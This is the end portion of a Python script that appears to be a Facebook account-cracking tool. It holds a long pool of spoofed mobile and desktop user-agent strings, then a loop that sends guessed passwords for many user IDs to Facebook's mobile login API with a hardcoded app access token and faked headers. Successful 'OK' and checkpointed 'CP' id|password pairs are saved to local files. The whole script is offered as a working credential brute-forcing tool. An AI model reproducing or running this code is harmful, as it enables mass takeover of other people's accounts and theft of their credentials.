"Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2357 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A235M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; 22011119UY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Build/NMA26.42-28; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/299.0.0.51.236;]",
"Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT; Android 11; M) AppleWebKit/533.84 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/533.84",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A600AZ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 AtContent/92.5.8544.45",
"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 DuckDuckGo/5 Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; RMX3231 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]",
"Mozilla/5.0 (Linux; Android 8.0.0; LG-H850 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; ASUS_A001D Build/PPR1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 GNews Android/2022089220",
"Mozilla/5.0 (Linux; Android 10; moto e(7) Build/QOGS30.569-83-18; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A205G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J410G Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.2 Chrome/107.0.5304.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 480dpi; 1080x2139; HUAWEI; POT-LX1; HWPOT-H; kirin710; it_IT; 510206032)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 LikeWise/98.6.4725.26",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18F72 Instagram 298.0.0.19.114 (iPhone8,4; iOS 14_6; es_ES; es; scale=2.00; 640x1136; 509296496)",
"Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A226B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Trailer/97.3.8642.43",
"Mozilla/5.0 (Linux; Android 7.0; SM-T810 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 5a) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.44",
"Mozilla/5.0 (Linux; arm_64; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 6 Pro) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.43",
"Mozilla/5.0 (Linux; Android 12; 220733SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5225.114 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Nokia G20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4125.119 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5755.140 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; W-V755-EEA Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; X95Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]",
"Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SNS32.34-72-31-1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 7.0; FRD-L09 Build/HUAWEIFRD-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 Instagram 298.0.0.19.114 (iPhone15,3; iOS 16_5_1; en_US; en; scale=3.00; 1290x2796; 509296496)",
"Mozilla/5.0 (Linux; Android 12; X10 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2363 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; LM-K410 Build/RKQ1.210420.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; CPH2359 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]",
"Mozilla/5.0 (Linux; Android 11; M2006C3LVG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_7_4; en-US) Gecko/20100101 Firefox/48.9",
"Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.14.108;]",
"Mozilla/5.0 (Linux; Android 10; W-V851-OPE Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_6_0; en-US) Gecko/20130401 Firefox/45.3",
"Mozilla/5.0 (Linux; Android 11; A55 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]",
"Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; V22) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; AFTALMO Build/PS7646.3550N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.170 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0",
"Mozilla/5.0 (Linux; Andr0id 10; BRAVIA 4K VH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 OPR/46.0.2207.0 OMI/4.21.0.273.DIA6.234 HbbTV/1.5.1 (+DRM; Sony; KD-43X89J; PKG6.7283.0829EUA; ; com.sony.HE.G4.4K; ) sony.hbbtv.tv.G4.2021HE.4K LaTivu_1.0.1_2021",
"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2694.93 Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2357) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36 OPR/77.0.4095.74331",
"Mozilla/5.0 (Linux; Android 6.0; LG-X230 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]",
"Mozilla/5.0 (Linux; Android 11; SM-A032M Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B110 Instagram 298.0.0.19.114 (iPhone13,2; iOS 16_1_2; it_GB; it; scale=3.00; 1170x2532; 509296496)",
"Mozilla/5.0 (Linux; Android 13; SM-G990B2 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.0.45;]",
"Mozilla/5.0 (Linux; Android 12; RMX2170 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/280.0.561456782 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 12; SM-A125M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (31/12; 300dpi; 720x1465; samsung; SM-A125M; a12; mt6765; pt_BR; 510206687)",
"Mozilla/5.0 (Linux; Android 11; SM-A022M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]",
"Mozilla/5.0 (Linux; Android 9; H3113 Build/50.2.A.3.77; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; V2109 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_9) AppleWebKit/536.27 (KHTML, like Gecko) Chrome/49.0.1732.137 Safari/603",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J415G Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; moto e40 Build/ROQS31.166-87-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (U; Linux i652 ) Gecko/20130401 Firefox/54.9",
"Mozilla/5.0 (iPad; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 Instagram 298.0.0.19.114 (iPad7,3; iPadOS 16_6; nl_BE; nl; scale=2.00; 750x1334; 509296496)",
"Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 320dpi; 720x1449; Xiaomi/Redmi; M2006C3MG; angelica; mt6765; pt_BR; 510206622)"
		])
		sys.stdout.write(
			"\r [ RAWAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth", "22581538",
				"x-fb-sim-hni", "24943",
				"x-fb-net-hni", "36567",
				"x-fb-connection-quRAWANty", "EXCELLENT",
				"x-fb-connection-type", "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent", 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H231H) AppleWebKit/537.36 (KHTML, like Gecko) 131.0.4931.92 Chrome/103.0.2.0 Safari/537.36', 
				"content-type", "application/x-www-form-urlencoded", 
				"x-fb-http-engine", "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ RAWAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-RAWAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ RAWAN-CP ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-RAWAN-CPK.txt","a").write(" %s | %s\n"%(uid, pw))
				break

			else:

				continue

		self.loop +=1		
		

Main()
